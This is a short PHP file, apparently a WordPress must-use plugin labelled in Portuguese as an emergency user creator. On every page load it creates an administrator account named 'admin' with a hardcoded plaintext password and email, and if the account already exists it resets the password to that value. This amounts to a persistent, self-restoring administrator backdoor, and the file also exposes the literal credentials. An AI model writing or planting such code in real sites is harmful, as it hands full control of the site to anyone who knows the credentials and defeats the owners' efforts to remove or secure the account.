<?php
// Criador de Usuário de Emergência (Must-Use Plugin)
add_action('init', function() {
    $username = 'admin';
    $password = 'Castro771920';
    $email    = 'contato@studiocastro.com.br';

    if (!username_exists($username)) {
        // Cria o usuário caso não exista
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        // Garante a senha caso ele já exista
        $user = get_user_by('login', $username);
        wp_set_password($password, $user->ID);
    }
});
